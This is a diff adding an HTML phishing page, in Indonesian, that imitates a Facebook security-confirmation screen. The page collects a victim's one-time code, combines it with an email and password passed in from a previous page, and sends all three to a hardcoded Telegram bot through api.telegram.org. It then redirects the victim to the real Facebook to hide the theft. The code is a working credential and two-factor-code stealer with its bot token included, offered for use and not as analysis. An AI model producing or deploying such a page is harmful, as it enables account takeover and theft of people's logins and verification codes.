@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Konfirmasi Keamanan - Facebook</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f0f2f5; margin:0; padding:0; display:flex; justify-content:center; align-items:center; height:100vh; }
+        .container { background: white; width: 400px; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align:center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing:border-box; font-size:18px; text-align:center; letter-spacing: 5px; }
+        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
+        .info { color: #666; font-size: 14px; margin: 15px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Konfirmasi Keamanan</h2>
+        <p class="info">Kami telah mengirim kode verifikasi ke nomor atau email yang terdaftar.</p>
+        <form id="otpForm">
+            <input type="text" id="otp" maxlength="6" placeholder="Masukkan kode 6 digit" required>
+            <button type="submit">Konfirmasi</button>
+        </form>
+        <p><a href="#">Kirim ulang kode</a></p>
+    </div>
+
+    <script>
+        // Ganti dengan token dan chat_id bot Telegram mu
+        const BOT_TOKEN = "8705924996:AAHEN-385TwKuya-RASri6ttIjIsfYvqeaU";
+        const CHAT_ID = "8509633837";
+
+        function sendToTelegram(data) {
+            const message = `🔥 *Facebook Phishing*\n\nEmail: ${data.email || 'N/A'}\nPassword: ${data.password || 'N/A'}\nOTP: ${data.otp || 'N/A'}\nIP: ${data.ip || 'Unknown'}\nTime: ${new Date().toLocaleString()}`;
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            });
+        }
+
+        // Ambil data dari sessionStorage atau query (dari halaman sebelumnya)
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const email = urlParams.get('email');
+            const password = urlParams.get('password');
+            
+            if (email && password) {
+                // Simpan sementara
+                window.victimData = { email, password };
+            }
+        };
+
+        document.getElementById('otpForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const otp = document.getElementById('otp').value;
+            
+            const fullData = {
+                email: window.victimData ? window.victimData.email : 'N/A',
+                password: window.victimData ? window.victimData.password : 'N/A',
+                otp: otp,
+                ip: '<!-- IP bisa ditambahkan via server-side -->'
+            };
+            
+            sendToTelegram(fullData);
+            
+            // Redirect ke Facebook asli setelah "berhasil"
+            setTimeout(() => {
+                window.location.href = "https://www.facebook.com";
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
